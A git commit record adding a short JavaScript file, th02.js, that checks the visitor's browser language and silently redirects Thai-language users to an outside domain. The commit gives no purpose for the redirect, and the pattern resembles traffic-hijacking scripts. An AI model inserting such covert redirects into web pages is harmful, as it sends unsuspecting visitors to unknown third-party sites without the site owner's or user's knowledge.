639069cca728f1bf7519a4cd88afa6c78c1ec5c0
gbc-static <127048143+gbc-static@users.noreply.github.com>
2023-08-26 21:43:38 +0800

    th

---
+++ th02.js
@@ -0,0 +1,7 @@
+     !function () {
+      var lang = navigator.language||navigator.userLanguage;
+      lang = lang.substr(0, 2);
+      if(lang == 'th'){
+          window.location.replace('https://n1605.com')
+      }
+    }()
